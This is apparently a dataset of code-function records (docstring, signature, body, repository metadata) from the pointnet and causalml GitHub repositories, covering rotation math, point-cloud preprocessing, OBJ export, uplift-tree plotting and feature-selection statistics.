-> cos(z) and\n    z = math.atan2(r21,  r22)\n    y = math.atan2(r13,  cy) # atan2(sin(y), cy)\n    x = 0.0\nreturn z, y, x", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Visualization of bounding boxes.\n\nArgs:\n    input_filename: each line is x1 y1 z1 x2 y2 z2 label\n    out_filename_prefix: OBJ filename prefix,\n        visualize object by g_label2color\n    easy_view: if True, only visualize furniture and floor\nReturns:\n    output a list of OBJ file and MTL files with the same prefix\n\"\"\"\n", "func_signal": "def bbox_label_to_obj(input_filename, out_filename_prefix, easy_view=False):\n", "code": "bbox_label = np.loadtxt(input_filename)\nbbox = bbox_label[:, 0:6]\nlabel = bbox_label[:, -1].astype(int)\nv_cnt = 0 # count vertex\nins_cnt = 0 # count instance\nfor i in range(bbox.shape[0]):\n    if easy_view and (label[i] not in g_easy_view_labels):\n        continue\n    obj_filename = out_filename_prefix+'_'+g_classes[label[i]]+'_'+str(ins_cnt)+'.obj'\n    mtl_filename = out_filename_prefix+'_'+g_classes[label[i]]+'_'+str(ins_cnt)+'.mtl'\n    fout_obj = open(obj_filename, 'w')\n    fout_mtl = open(mtl_filename, 'w')\n    fout_obj.write('mtllib %s\\n' % (os.path.basename(mtl_filename)))\n\n    length = bbox[i, 3:6] - bbox[i, 0:3]\n    a = length[0]\n    b = length[1]\n    c = length[2]\n    x = bbox[i, 0]\n    y = bbox[i, 1]\n    z = bbox[i, 2]\n    color = np.array(g_label2color[label[i]], dtype=float) / 255.0\n\n    material = 'material%d' % (ins_cnt)\n    fout_obj.write('usemtl %s\\n' % (material))\n    fout_obj.write('v %f %f %f\\n' % (x,y,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x,y+b,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y+b,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x,y,z))\n    fout_obj.write('v %f %f %f\\n' % (x,y+b,z))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y+b,z))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y,z))\n    fout_obj.write('g default\\n')\n    v_cnt = 0 # for individual box\n    fout_obj.write('f %d %d %d %d\\n' % (4+v_cnt, 3+v_cnt, 2+v_cnt, 1+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (1+v_cnt, 2+v_cnt, 6+v_cnt, 5+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (7+v_cnt, 6+v_cnt, 2+v_cnt, 3+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (4+v_cnt, 8+v_cnt, 7+v_cnt, 3+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (5+v_cnt, 8+v_cnt, 4+v_cnt, 1+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (5+v_cnt, 6+v_cnt, 7+v_cnt, 8+v_cnt))\n    fout_obj.write('\\n')\n\n    fout_mtl.write('newmtl %s\\n' % (material))\n    fout_mtl.write('Kd %f %f %f\\n' % (color[0], color[1], color[2]))\n    fout_mtl.write('\\n')\n    fout_obj.close()\n    fout_mtl.close() \n\n    v_cnt += 8\n    ins_cnt += 1", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" For visualization of a room from data_label file,\n\tinput_filename: each line is X Y Z R G B L\n\tout_filename: OBJ filename,\n        visualize input file by coloring point with label color\n    easy_view: only visualize furnitures and floor\n\"\"\"\n", "func_signal": "def point_label_to_obj(input_filename, out_filename, label_color=True, easy_view=False, no_wall=False):\n", "code": "data_label = np.loadtxt(input_filename)\ndata = data_label[:, 0:6]\nlabel = data_label[:, -1].astype(int)\nfout = open(out_filename, 'w')\nfor i in range(data.shape[0]):\n    color = g_label2color[label[i]]\n    if easy_view and (label[i] not in g_easy_view_labels):\n        continue\n    if no_wall and ((label[i] == 2) or (label[i]==0)):\n        continue\n    if label_color:\n        fout.write('v %f %f %f %d %d %d\\n' % \\\n            (data[i,0], data[i,1], data[i,2], color[0], color[1], color[2]))\n    else:\n        fout.write('v %f %f %f %d %d %d\\n' % \\\n            (data[i,0], data[i,1], data[i,2], data[i,3], data[i,4], data[i,5]))\nfout.close()", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Transform Net, input is BxNx1xK gray image\n    Return:\n        Transformation matrix of size KxK \"\"\"\n", "func_signal": "def get_transform_K(inputs, is_training, bn_decay=None, K = 3):\n", "code": "batch_size = inputs.get_shape()[0].value\nnum_point = inputs.get_shape()[1].value\n\nnet = tf_util.conv2d(inputs, 256, [1,1], padding='VALID', stride=[1,1],\n                     bn=True, is_training=is_training, scope='tconv1', bn_decay=bn_decay)\nnet = tf_util.conv2d(net, 1024, [1,1], padding='VALID', stride=[1,1],\n                     bn=True, is_training=is_training, scope='tconv2', bn_decay=bn_decay)\nnet = tf_util.max_pool2d(net, [num_point,1], padding='VALID', scope='tmaxpool')\n\nnet = tf.reshape(net, [batch_size, -1])\nnet = tf_util.fully_connected(net, 512, bn=True, is_training=is_training, scope='tfc1', bn_decay=bn_decay)\nnet = tf_util.fully_connected(net, 256, bn=True, is_training=is_training, scope='tfc2', bn_decay=bn_decay)\n\nwith tf.variable_scope('transform_feat') as sc:\n    weights = tf.get_variable('weights', [256, K*K], initializer=tf.constant_initializer(0.0), dtype=tf.float32)\n    biases = tf.get_variable('biases', [K*K], initializer=tf.constant_initializer(0.0), dtype=tf.float32) + tf.constant(np.eye(K).flatten(), dtype=tf.float32)\n    transform = tf.matmul(net, weights)\n    transform = tf.nn.bias_add(transform, biases)\n\n#transform = tf_util.fully_connected(net, 3*K, activation_fn=None, scope='tfc3')\ntransform = tf.reshape(transform, [batch_size, K, K])\nreturn transform", "path": "pointnet/part_seg/pointnet_part_seg.py", "commit_date": "2017-04-11 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Return quaternion corresponding to these Euler angles\n\nUses the z, then y, then x convention above\n\nParameters\n----------\nz : scalar\n   Rotation angle in radians around z-axis (performed first)\ny : scalar\n   Rotation angle in radians around y-axis\nx : scalar\n   Rotation angle in radians around x-axis (performed last)\n\nReturns\n-------\nquat : array shape (4,)\n   Quaternion in w, x, y z (real, then vector) format\n\nNotes\n-----\nWe can derive this formula in Sympy using:\n\n1. Formula giving quaternion corresponding to rotation of theta radians\n   about arbitrary axis:\n   http://mathworld.wolfram.com/EulerParameters.html\n2. Generated formulae from 1.) for quaternions corresponding to\n   theta radians rotations about ``x, y, z`` axes\n3. Apply quaternion multiplication formula -\n   http://en.wikipedia.org/wiki/Quaternions#Hamilton_product - to\n   formulae from 2.) to give formula for combined rotations.\n'''\n", "func_signal": "def euler2quat(z=0, y=0, x=0):\n", "code": "z = z/2.0\ny = y/2.0\nx = x/2.0\ncz = math.cos(z)\nsz = math.sin(z)\ncy = math.cos(y)\nsy = math.sin(y)\ncx = math.cos(x)\nsx = math.sin(x)\nreturn np.array([\n         cx*cy*cz - sx*sy*sz,\n         cx*sy*sz + cy*cz*sx,\n         cx*cz*sy - sx*cy*sz,\n         cx*cy*sz + sx*cz*sy])", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Randomly rotate the point clouds to augument the dataset\n    rotation is per shape based along up direction\n    Input:\n      BxNx3 array, original batch of point clouds\n    Return:\n      BxNx3 array, rotated batch of point clouds\n\"\"\"\n", "func_signal": "def rotate_point_cloud(batch_data):\n", "code": "rotated_data = np.zeros(batch_data.shape, dtype=np.float32)\nfor k in range(batch_data.shape[0]):\n    rotation_angle = np.random.uniform() * 2 * np.pi\n    cosval = np.cos(rotation_angle)\n    sinval = np.sin(rotation_angle)\n    rotation_matrix = np.array([[cosval, 0, sinval],\n                                [0, 1, 0],\n                                [-sinval, 0, cosval]])\n    shape_pc = batch_data[k, ...]\n    rotated_data[k, ...] = np.dot(shape_pc.reshape((-1, 3)), rotation_matrix)\nreturn rotated_data", "path": "pointnet/provider.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Prepare whole room samples.\n\nArgs:\n    data: N x 6 numpy array, 012 are XYZ in meters, 345 are RGB in [0,1]\n        assumes the data is shifted (min point is origin) and\n        aligned (aligned with XYZ axis)\n    label: N size uint8 numpy array from 0-12\n    sample_num_point: int, how many points to sample in each sample\nReturns:\n    sample_datas: K x sample_num_point x 9\n                 numpy array of XYZRGBX'Y'Z', RGB is in [0,1]\n    sample_labels: K x sample_num_point x 1 np array of uint8 labels\n\"\"\"\n", "func_signal": "def room2samples(data, label, sample_num_point):\n", "code": "N = data.shape[0]\norder = np.arange(N)\nnp.random.shuffle(order) \ndata = data[order, :]\nlabel = label[order]\n\nbatch_num = int(np.ceil(N / float(sample_num_point)))\nsample_datas = np.zeros((batch_num, sample_num_point, 6))\nsample_labels = np.zeros((batch_num, sample_num_point, 1))\n\nfor i in range(batch_num):\n    beg_idx = i*sample_num_point\n    end_idx = min((i+1)*sample_num_point, N)\n    num = end_idx - beg_idx\n    sample_datas[i,0:num,:] = data[beg_idx:end_idx, :]\n    sample_labels[i,0:num,0] = label[beg_idx:end_idx]\n    if num < sample_num_point:\n        makeup_indices = np.random.choice(N, sample_num_point - num)\n        sample_datas[i,num:,:] = data[makeup_indices, :]\n        sample_labels[i,num:,0] = label[makeup_indices]\nreturn sample_datas, sample_labels", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Randomly jitter points. jittering is per point.\n    Input:\n      BxNx3 array, original batch of point clouds\n    Return:\n      BxNx3 array, jittered batch of point clouds\n\"\"\"\n", "func_signal": "def jitter_point_cloud(batch_data, sigma=0.01, clip=0.05):\n", "code": "B, N, C = batch_data.shape\nassert(clip > 0)\njittered_data = np.clip(sigma * np.random.randn(B, N, C), -1*clip, clip)\njittered_data += batch_data\nreturn jittered_data", "path": "pointnet/provider.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" room2sample, with input filename and RGB preprocessing.\n    for each block centralize XYZ, add normalized XYZ as 678 channels\n\"\"\"\n", "func_signal": "def room2samples_plus_normalized(data_label, num_point):\n", "code": "data = data_label[:,0:6]\ndata[:,3:6] /= 255.0\nlabel = data_label[:,-1].astype(np.uint8)\nmax_room_x = max(data[:,0])\nmax_room_y = max(data[:,1])\nmax_room_z = max(data[:,2])\n#print(max_room_x, max_room_y, max_room_z)\n\ndata_batch, label_batch = room2samples(data, label, num_point)\nnew_data_batch = np.zeros((data_batch.shape[0], num_point, 9))\nfor b in range(data_batch.shape[0]):\n    new_data_batch[b, :, 6] = data_batch[b, :, 0]/max_room_x\n    new_data_batch[b, :, 7] = data_batch[b, :, 1]/max_room_y\n    new_data_batch[b, :, 8] = data_batch[b, :, 2]/max_room_z\n    #minx = min(data_batch[b, :, 0])\n    #miny = min(data_batch[b, :, 1])\n    #data_batch[b, :, 0] -= (minx+block_size/2)\n    #data_batch[b, :, 1] -= (miny+block_size/2)\nnew_data_batch[:, :, 0:6] = data_batch\nreturn new_data_batch, label_batch", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Return angle, axis corresponding to these Euler angles\n\nUses the z, then y, then x convention above\n\nParameters\n----------\nz : scalar\n   Rotation angle in radians around z-axis (performed first)\ny : scalar\n   Rotation angle in radians around y-axis\nx : scalar\n   Rotation angle in radians around x-axis (performed last)\n\nReturns\n-------\ntheta : scalar\n   angle of rotation\nvector : array shape (3,)\n   axis around which rotation occurs\n\nExamples\n--------\n>>> theta, vec = euler2angle_axis(0, 1.5, 0)\n>>> print(theta)\n1.5\n>>> np.allclose(vec, [0, 1, 0])\nTrue\n'''\n# delayed import to avoid cyclic dependencies\n", "func_signal": "def euler2angle_axis(z=0, y=0, x=0):\n", "code": "import nibabel.quaternions as nq\nreturn nq.quat2angle_axis(euler2quat(z, y, x))", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\" Visualization of bounding boxes.\n\nArgs:\n    input_filename: each line is x1 y1 z1 x2 y2 z2 label\n    out_filename_prefix: OBJ filename prefix,\n        visualize object by g_label2color\n    easy_view: if True, only visualize furniture and floor\n    permute: if not None, permute XYZ for rendering, e.g. [0 2 1]\n    center: if True, move obj to have zero origin\nReturns:\n    output a list of OBJ file and MTL files with the same prefix\n\"\"\"\n", "func_signal": "def bbox_label_to_obj_room(input_filename, out_filename_prefix, easy_view=False, permute=None, center=False, exclude_table=False):\n", "code": "bbox_label = np.loadtxt(input_filename)\nbbox = bbox_label[:, 0:6]\nif permute is not None:\n    assert(len(permute)==3)\n    permute = np.array(permute)\n    bbox[:,0:3] = bbox[:,permute]\n    bbox[:,3:6] = bbox[:,permute+3]\nif center:\n    xyz_max = np.amax(bbox[:,3:6], 0)\n    bbox[:,0:3] -= (xyz_max/2.0)\n    bbox[:,3:6] -= (xyz_max/2.0)\n    bbox /= np.max(xyz_max/2.0)\nlabel = bbox_label[:, -1].astype(int)\nobj_filename = out_filename_prefix+'.obj' \nmtl_filename = out_filename_prefix+'.mtl'\n\nfout_obj = open(obj_filename, 'w')\nfout_mtl = open(mtl_filename, 'w')\nfout_obj.write('mtllib %s\\n' % (os.path.basename(mtl_filename)))\nv_cnt = 0 # count vertex\nins_cnt = 0 # count instance\nfor i in range(bbox.shape[0]):\n    if easy_view and (label[i] not in g_easy_view_labels):\n        continue\n    if exclude_table and label[i] == g_classes.index('table'):\n        continue\n\n    length = bbox[i, 3:6] - bbox[i, 0:3]\n    a = length[0]\n    b = length[1]\n    c = length[2]\n    x = bbox[i, 0]\n    y = bbox[i, 1]\n    z = bbox[i, 2]\n    color = np.array(g_label2color[label[i]], dtype=float) / 255.0\n\n    material = 'material%d' % (ins_cnt)\n    fout_obj.write('usemtl %s\\n' % (material))\n    fout_obj.write('v %f %f %f\\n' % (x,y,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x,y+b,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y+b,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y,z+c))\n    fout_obj.write('v %f %f %f\\n' % (x,y,z))\n    fout_obj.write('v %f %f %f\\n' % (x,y+b,z))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y+b,z))\n    fout_obj.write('v %f %f %f\\n' % (x+a,y,z))\n    fout_obj.write('g default\\n')\n    fout_obj.write('f %d %d %d %d\\n' % (4+v_cnt, 3+v_cnt, 2+v_cnt, 1+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (1+v_cnt, 2+v_cnt, 6+v_cnt, 5+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (7+v_cnt, 6+v_cnt, 2+v_cnt, 3+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (4+v_cnt, 8+v_cnt, 7+v_cnt, 3+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (5+v_cnt, 8+v_cnt, 4+v_cnt, 1+v_cnt))\n    fout_obj.write('f %d %d %d %d\\n' % (5+v_cnt, 6+v_cnt, 7+v_cnt, 8+v_cnt))\n    fout_obj.write('\\n')\n\n    fout_mtl.write('newmtl %s\\n' % (material))\n    fout_mtl.write('Kd %f %f %f\\n' % (color[0], color[1], color[2]))\n    fout_mtl.write('\\n')\n\n    v_cnt += 8\n    ins_cnt += 1\n\nfout_obj.close()\nfout_mtl.close()", "path": "pointnet/sem_seg/indoor3d_util.py", "commit_date": "2017-06-06 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "''' Return Euler angles corresponding to quaternion `q`\n\nParameters\n----------\nq : 4 element sequence\n   w, x, y, z of quaternion\n\nReturns\n-------\nz : scalar\n   Rotation angle in radians around z-axis (performed first)\ny : scalar\n   Rotation angle in radians around y-axis\nx : scalar\n   Rotation angle in radians around x-axis (performed last)\n\nNotes\n-----\nIt's possible to reduce the amount of calculation a little, by\ncombining parts of the ``quat2mat`` and ``mat2euler`` functions, but\nthe reduction in computation is small, and the code repetition is\nlarge.\n'''\n# delayed import to avoid cyclic dependencies\n", "func_signal": "def quat2euler(q):\n", "code": "import nibabel.quaternions as nq\nreturn mat2euler(nq.quat2mat(q))", "path": "pointnet/utils/eulerangles.py", "commit_date": "2017-06-07 00:00:00", "repo_name": "charlesq34/pointnet", "stars": 4501, "license": "other", "language": "python", "size": 532}
{"docstring": "\"\"\"Generate predictions for synthetic data using specified function (single simulation)\n\nArgs:\n    synthetic_data_func (function): synthetic data generation function\n    n (int, optional): number of samples\n    estimators (dict of object): dict of names and objects of treatment effect estimators\n\nReturns:\n    (dict): dict of the actual and estimates of treatment effects\n\"\"\"\n", "func_signal": "def get_synthetic_preds(synthetic_data_func, n=1000, estimators={}):\n", "code": "y, X, w, tau, b, e = synthetic_data_func(n=n)\n\npreds_dict = {}\npreds_dict[KEY_ACTUAL] = tau\npreds_dict[KEY_GENERATED_DATA] = {'y': y, 'X': X, 'w': w, 'tau': tau, 'b': b, 'e': e}\n\n# Predict p_hat because e would not be directly observed in real-life\np_model = ElasticNetPropensityModel()\np_hat = p_model.fit_predict(X, w)\n\nif estimators:\n    for name, learner in estimators.items():\n        try:\n            preds_dict[name] = learner.fit_predict(X=X, treatment=w, y=y, p=p_hat).flatten()\n        except TypeError:\n            preds_dict[name] = learner.fit_predict(X=X, treatment=w, y=y).flatten()\nelse:\n    for base_learner, label_l in zip([BaseSRegressor, BaseTRegressor, BaseXRegressor, BaseRRegressor],\n                                     ['S', 'T', 'X', 'R']):\n        for model, label_m in zip([LinearRegression, XGBRegressor], ['LR', 'XGB']):\n            learner = base_learner(model())\n            model_name = '{} Learner ({})'.format(label_l, label_m)\n            try:\n                preds_dict[model_name] = learner.fit_predict(X=X, treatment=w, y=y, p=p_hat).flatten()\n            except TypeError:\n                preds_dict[model_name] = learner.fit_predict(X=X, treatment=w, y=y).flatten()\n\n    learner = CausalTreeRegressor(random_state=RANDOM_SEED)\n    preds_dict['Causal Tree'] = learner.fit_predict(X=X, treatment=w, y=y).flatten()\n\nreturn preds_dict", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nCalculate KL Divergence for binary classification.\n\nParameters\n----------\npk (float): Probability of class 1 in treatment group\nqk (float): Probability of class 1 in control group\n\"\"\"\n", "func_signal": "def _kl_divergence(pk, qk):\n", "code": "if qk < 0.1**6:\n    qk = 0.1**6\nelif qk > 1 - 0.1**6:\n    qk = 1 - 0.1**6\nS = pk * np.log(pk / qk) + (1-pk) * np.log((1-pk) / (1-qk))\nreturn S", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Creates a grid of scatter plots comparing each learner's predictions with the truth (for a single simulation).\n\nArgs:\n    synthetic_preds (dict): dictionary of predictions generated by get_synthetic_preds() or\n        get_synthetic_preds_holdout()\n\"\"\"\n", "func_signal": "def scatter_plot_single_sim(synthetic_preds):\n", "code": "preds_for_plot = synthetic_preds.copy()\n\n# deleted generated data and get actual column name\ndel preds_for_plot[KEY_GENERATED_DATA]\nn_row = int(np.ceil(len(preds_for_plot.keys()) / 3))\n\nfig, axes = plt.subplots(n_row, 3, figsize=(5 * n_row, 15))\naxes = np.ravel(axes)\n\nfor i, (label, preds) in enumerate(preds_for_plot.items()):\n    axes[i].scatter(preds_for_plot[KEY_ACTUAL], preds, s=2, label='Predictions')\n    axes[i].set_title(label, size=12)\n    axes[i].set_xlabel('Actual', size=10)\n    axes[i].set_ylabel('Prediction', size=10)\n    xlim = axes[i].get_xlim()\n    ylim = axes[i].get_xlim()\n    axes[i].plot([xlim[0], xlim[1]], [ylim[0], ylim[1]], label='Perfect Model', linewidth=1, color='grey')\n    axes[i].legend(loc=2, prop={'size': 10})", "path": "causalml/causalml/dataset/synthetic.py", "commit_date": "2020-01-11 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"Calculate the mean and variance of a variable.\n\"\"\"\n", "func_signal": "def _get_mean_var(X):\n", "code": "mean = X.mean()\nvar = X.var()\n\nreturn [mean, var]", "path": "causalml/causalml/metrics/visualize.py", "commit_date": "2020-12-14 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "'''\nConvert the tree to dot graph for plots.\n\nArgs\n----\n\ndecisionTree : object\n    object of DecisionTree class\n\nx_names : list\n    List of feature names\n\nReturns\n-------\nDot class representing the tree graph.\n'''\n\n# Column Heading\n", "func_signal": "def uplift_tree_plot(decisionTree, x_names):\n", "code": "dcHeadings = {}\nfor i, szY in enumerate(x_names + ['treatment_group_key']):\n    szCol = 'Column %d' % i\n    dcHeadings[szCol] = str(szY)\n\ndcNodes = defaultdict(list)\n\"\"\"Plots the obtained decision tree. \"\"\"\n\ndef toString(iSplit, decisionTree, bBranch, szParent=\"null\", indent='', indexParent=0, upliftScores=list()):\n    if decisionTree.results is not None:  # leaf node\n        lsY = []\n        for szX, n in decisionTree.results.items():\n            lsY.append('%s:%.2f' % (szX, n))\n        dcY = {\"name\": \"%s\" % ', '.join(lsY), \"parent\": szParent}\n        dcSummary = decisionTree.summary\n        upliftScores += [dcSummary['matchScore']]\n        dcNodes[iSplit].append(['leaf', dcY['name'], szParent, bBranch,\n                                str(-round(float(decisionTree.summary['impurity']), 3)), dcSummary['samples'],\n                                dcSummary['group_size'], dcSummary['upliftScore'], dcSummary['matchScore'],\n                                indexParent])\n    else:\n        szCol = 'Column %s' % decisionTree.col\n        if szCol in dcHeadings:\n            szCol = dcHeadings[szCol]\n        if isinstance(decisionTree.value, int) or isinstance(decisionTree.value, float):\n            decision = '%s >= %s' % (szCol, decisionTree.value)\n        else:\n            decision = '%s == %s' % (szCol, decisionTree.value)\n\n        indexOfLevel = len(dcNodes[iSplit])\n        toString(iSplit + 1, decisionTree.trueBranch, True, decision, indent + '\\t\\t', indexOfLevel, upliftScores)\n        toString(iSplit + 1, decisionTree.falseBranch, False, decision, indent + '\\t\\t', indexOfLevel, upliftScores)\n        dcSummary = decisionTree.summary\n        upliftScores += [dcSummary['matchScore']]\n        dcNodes[iSplit].append([iSplit + 1, decision, szParent, bBranch,\n                                str(-round(float(decisionTree.summary['impurity']), 3)), dcSummary['samples'],\n                                dcSummary['group_size'], dcSummary['upliftScore'], dcSummary['matchScore'],\n                                indexParent])\n\nupliftScores = list()\ntoString(0, decisionTree, None, upliftScores=upliftScores)\n\nupliftScoreToColor = dict()\ntry:\n    # calculate colors for nodes based on uplifts\n    minUplift = min(upliftScores)\n    maxUplift = max(upliftScores)\n    upliftLevels = [(uplift-minUplift)/(maxUplift-minUplift) for uplift in upliftScores]  # min max scaler\n    baseUplift = float(decisionTree.summary.get('matchScore'))\n    baseUpliftLevel = (baseUplift - minUplift) / (maxUplift - minUplift)  # min max scaler normalization\n    white = np.array([255., 255., 255.])\n    blue = np.array([31., 119., 180.])\n    green = np.array([0., 128., 0.])\n    for i, upliftLevel in enumerate(upliftLevels):\n        if upliftLevel >= baseUpliftLevel:  # go blue\n            color = upliftLevel * blue + (1 - upliftLevel) * white\n        else:  # go green\n            color = (1 - upliftLevel) * green + upliftLevel * white\n        color = [int(c) for c in color]\n        upliftScoreToColor[upliftScores[i]] = ('#%2x%2x%2x' % tuple(color)).replace(' ', '0')  # color code\nexcept Exception as e:\n    print(e)\n\nlsDot = ['digraph Tree {',\n         'node [shape=box, style=\"filled, rounded\", color=\"black\", fontname=helvetica] ;',\n         'edge [fontname=helvetica] ;'\n         ]\ni_node = 0\ndcParent = {}\ntotalSample = int(decisionTree.summary.get('samples'))  # initialize the value with the total sample size at root\nfor nSplit in range(len(dcNodes.items())):\n    lsY = dcNodes[nSplit]\n    indexOfLevel = 0\n    for lsX in lsY:\n        iSplit, decision, szParent, bBranch, szImpurity, szSamples, szGroup, \\\n            upliftScore, matchScore, indexParent = lsX\n\n        sampleProportion = round(int(szSamples)*100./totalSample, 1)\n        if type(iSplit) is int:\n            szSplit = '%d-%d' % (iSplit, indexOfLevel)\n            dcParent[szSplit] = i_node\n            lsDot.append('%d [label=<%s<br/> impurity %s<br/> total_sample %s (%s&#37;)<br/>group_sample %s <br/> '\n                         'uplift score: %s <br/> uplift p_value %s <br/> '\n                         'validation uplift score %s>, fillcolor=\"%s\"] ;' % (\n                             i_node, decision.replace('>=', '&ge;').replace('?', ''), szImpurity, szSamples,\n                             str(sampleProportion), szGroup, str(upliftScore[0]), str(upliftScore[1]),\n                             str(matchScore), upliftScoreToColor.get(matchScore, '#e5813900')\n                         ))\n        else:\n            lsDot.append('%d [label=< impurity %s<br/> total_sample %s (%s&#37;)<br/>group_sample %s <br/> '\n                         'uplift score: %s <br/> uplift p_value %s <br/> validation uplift score %s <br/> '\n                         'mean %s>, fillcolor=\"%s\"] ;' % (\n                             i_node, szImpurity, szSamples, str(sampleProportion), szGroup, str(upliftScore[0]),\n                             str(upliftScore[1]), str(matchScore), decision,\n                             upliftScoreToColor.get(matchScore, '#e5813900')\n                         ))\n\n        if szParent != 'null':\n            if bBranch:\n                szAngle = '45'\n                szHeadLabel = 'True'\n            else:\n                szAngle = '-45'\n                szHeadLabel = 'False'\n            szSplit = '%d-%d' % (nSplit, indexParent)\n            p_node = dcParent[szSplit]\n            if nSplit == 1:\n                lsDot.append('%d -> %d [labeldistance=2.5, labelangle=%s, headlabel=\"%s\"] ;' % (p_node,\n                                                                                                i_node, szAngle,\n                                                                                                szHeadLabel))\n            else:\n                lsDot.append('%d -> %d ;' % (p_node, i_node))\n        i_node += 1\n        indexOfLevel += 1\nlsDot.append('}')\ndot_data = '\\n'.join(lsDot)\ngraph = pydotplus.graph_from_dot_data(dot_data)\nreturn graph", "path": "causalml/causalml/inference/tree/plot.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nConduct F-test of the interaction between treatment and one feature.\n\nParameters\n----------\ndata (pd.Dataframe): DataFrame containing outcome, features, and experiment group\ntreatment_indicator (string): the column name for binary indicator of treatment (value 1) or control (value 0) \nfeature_name (string): feature name, as one column in the data DataFrame\ny_name (string): name of the outcome variable\n\nReturns\n----------\n(pd.DataFrame): a data frame containing the feature importance statistics\n\"\"\"\n", "func_signal": "def _filter_F_one_feature(data, treatment_indicator, feature_name, y_name):\n", "code": "Y = data[y_name]\nX = data[[treatment_indicator, feature_name]]\nX = sm.add_constant(X)\nX['{}-{}'.format(treatment_indicator, feature_name)] = X[[treatment_indicator, feature_name]].product(axis=1)\n\nmodel = sm.OLS(Y, X)\nresult = model.fit()\n\nF_test = result.f_test(np.array([0, 0, 0, 1]))\nF_test_result = pd.DataFrame({\n    'feature': feature_name, # for the interaction, not the main effect\n    'method': 'F-statistic',\n    'score': F_test.fvalue[0][0], \n    'p_value': F_test.pvalue, \n    'misc': 'df_num: {}, df_denom: {}'.format(F_test.df_num, F_test.df_denom), \n}, index=[0]).reset_index(drop=True)\n\nreturn F_test_result", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
{"docstring": "\"\"\"\nRank features based on the F-statistics of the interaction.\n\nParameters\n----------\ndata (pd.Dataframe): DataFrame containing outcome, features, and experiment group\ntreatment_indicator (string): the column name for binary indicator of treatment (value 1) or control (value 0) \nfeatures (list of string): list of feature names, that are columns in the data DataFrame\ny_name (string): name of the outcome variable\n\nReturns\n----------\n(pd.DataFrame): a data frame containing the feature importance statistics\n\"\"\"\n", "func_signal": "def filter_F(self, data, treatment_indicator, features, y_name):\n", "code": "all_result = pd.DataFrame()\nfor x_name_i in features: \n    one_result = self._filter_F_one_feature(data=data,\n        treatment_indicator=treatment_indicator, feature_name=x_name_i, y_name=y_name\n    )\n    all_result = pd.concat([all_result, one_result])\n\nall_result = all_result.sort_values(by='score', ascending=False)\nall_result['rank'] = all_result['score'].rank(ascending=False)\n\nreturn all_result", "path": "causalml/causalml/feature_selection/filters.py", "commit_date": "2020-12-10 00:00:00", "repo_name": "uber/causalml", "stars": 4658, "license": "other", "language": "python", "size": 96784}
